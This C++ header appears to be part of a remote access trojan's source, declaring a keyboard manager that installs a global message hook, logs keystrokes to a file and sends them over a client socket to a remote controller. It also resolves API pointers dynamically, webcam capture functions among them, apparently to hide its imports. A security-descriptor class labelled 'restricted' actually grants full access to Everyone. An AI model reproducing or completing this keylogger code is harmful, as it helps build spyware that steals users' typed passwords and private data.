// KeyboardManager.h: interface for the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
#define AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "until.h"


class CShareRestrictedSD  
{
public:
	CShareRestrictedSD()
	{
		ptr = NULL;
		sa.nLength = sizeof(sa);
		sa.lpSecurityDescriptor = &sd;
		sa.bInheritHandle = FALSE;
		// build a restricted security descriptor
		ptr = BuildRestrictedSD(&sd);
	}

	virtual ~CShareRestrictedSD()
	{
		if (ptr)
			FreeRestrictedSD(ptr);
	}

	LPVOID BuildRestrictedSD(PSECURITY_DESCRIPTOR pSD) 
	{
		
		DWORD  dwAclLength;
		PSID   psidEveryone = NULL;
		PACL   pDACL = NULL;
		BOOL   bResult = FALSE;
		PACCESS_ALLOWED_ACE pACE = NULL;
		SID_IDENTIFIER_AUTHORITY siaWorld = SECURITY_WORLD_SID_AUTHORITY  ;
		SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
		
		__try {
			
			// initialize the security descriptor
			if (!InitializeSecurityDescriptor(pSD, 
				SECURITY_DESCRIPTOR_REVISION)) {
				__leave;
			}
			
			// obtain a sid for the Authenticated Users Group
			if (!AllocateAndInitializeSid(&siaWorld, 1, 
				SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, 
				&psidEveryone)) {
				__leave;
			}
			
			// NOTE:
			// 
			// The Authenticated Users group includes all user accounts that
			// have been successfully authenticated by the system. If access
			// must be restricted to a specific user or group other than 
			// Authenticated Users, the SID can be constructed using the
			// LookupAccountSid() API based on a user or group name.
			
			// calculate the DACL length
			dwAclLength = sizeof(ACL)
				// add space for Authenticated Users group ACE
				+ sizeof(ACCESS_ALLOWED_ACE) - sizeof(DWORD)
				+ GetLengthSid(psidEveryone);
			
			// allocate memory for the DACL
			pDACL = (PACL) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 
				dwAclLength);
			if (!pDACL) {
				__leave;
			}
			
			// initialize the DACL
			if (!InitializeAcl(pDACL, dwAclLength, ACL_REVISION)) {
				__leave;
			}
			
			// add the Authenticated Users group ACE to the DACL with
			// GENERIC_READ, GENERIC_WRITE, and GENERIC_EXECUTE access
			if (!AddAccessAllowedAce(pDACL, ACL_REVISION,
				GENERIC_ALL,
				psidEveryone)) {
				__leave;
			}
			// set the DACL in the security descriptor
			if (!SetSecurityDescriptorDacl(pSD, TRUE, pDACL, FALSE)) {
				__leave;
			}
			
			bResult = TRUE;
			
		} 
		__finally {
			if (psidEveryone) FreeSid(psidEveryone);
		}
		
		if (bResult == FALSE) {
			if (pDACL) HeapFree(GetProcessHeap(), 0, pDACL);
			pDACL = NULL;
		}
		
		return (LPVOID) pDACL;
	}

	// The following function frees memory allocated in the
	// BuildRestrictedSD() function
	VOID FreeRestrictedSD(LPVOID ptr) 
	{
		if (ptr) HeapFree(GetProcessHeap(), 0, ptr);
	}

	SECURITY_ATTRIBUTES* GetSA()
	{
		if (ptr)
			return &sa;
		else
			return NULL;
	}

protected:
	LPVOID ptr;
	SECURITY_ATTRIBUTES sa;
	SECURITY_DESCRIPTOR sd;
};

////////////////////////////////////////////////////////////////////////////////////////////////////
typedef	HMODULE	(__stdcall *pLoadLibraryA)(LPCSTR);
typedef	DWORD	(__stdcall *pGetProcAddress)(HMODULE,LPCSTR);
typedef	int		(__stdcall *pclosesocket)(SOCKET);
typedef	UINT	(__stdcall *pGetSystemDirectoryA)(LPSTR,UINT);
typedef	int		(__stdcall *psend)(SOCKET,const char FAR *,int,int);
typedef	VOID	(__stdcall *pSleep)(DWORD);
typedef	LPSTR	(__stdcall *plstrcatA)(LPSTR,LPCSTR);
typedef	DWORD	(__stdcall *pGetTempPathA)(DWORD,LPSTR);
typedef	BOOL	(__stdcall *pcapGetDriverDescriptionA)(UINT,LPSTR,int,LPSTR,int);
typedef	HWND	(__stdcall *pcapCreateCaptureWindowA)(LPCSTR,DWORD,int,int,int,int,HWND,int);
typedef	DWORD	(__stdcall *pSetFilePointer)(HANDLE,LONG,PLONG,DWORD);
typedef	BOOL	(__stdcall *pMoveFileA)(LPCSTR,LPCSTR);
typedef	DWORD	(__stdcall *pGetShortPathNameA)(LPCSTR,LPSTR,DWORD);
typedef	DWORD	(__stdcall *pGetModuleFileNameA)(HMODULE,LPSTR,DWORD);
////////////////////////////////////////////////////////////////////////////////////////////////////


BOOL  StartEnLog();


class CKeyboardManager : public CManager  
{
public:
	CKeyboardManager(CClientSocket *pClient);
	virtual ~CKeyboardManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static BOOL StartHook();
	static void StopHook();
	static BOOL Initialization();

	static HINSTANCE g_hInstance;
	static DWORD m_dwLastMsgTime;
	static TShared* m_pTShared;
	static HANDLE m_hMapping_File;
	static	DWORD	dwTickCount;
	static	char	ConnPass[256];
	static	HANDLE	hProtect;
	static	HANDLE	hFile;


	static pclosesocket Myclosesocket;
	static pLoadLibraryA MyLoadLibrary;
	static pGetProcAddress MyGetProcAddress;
	static pGetSystemDirectoryA MyGetSystemDirectory;
	static psend Mysend;
	static pSleep MySleep;
	static plstrcatA Mylstrcat;
	static pGetTempPathA MyGetTempPath;
	static pcapCreateCaptureWindowA MycapCreateCaptureWindow;
	static pcapGetDriverDescriptionA MycapGetDriverDescription;
	static pSetFilePointer MySetFilePointer;
	static pMoveFileA MyMoveFile;
	static pGetShortPathNameA MyGetShortPathName;
	static pGetModuleFileNameA MyGetModuleFileName;
	static int Mylstrlen( const char *str );
	static char* NumToStr( DWORD Nos, int JZ );
	static BOOL MyFuncInitialization();
private:
	static LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);
	static void SaveInfo(char *lpBuffer);
	static void SaveToFile(char *lpBuffer);
	int sendOfflineRecord();
	int sendStartKeyBoard();
	int sendKeyBoardData(LPBYTE lpData, UINT nSize);

};

#endif // !defined(AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
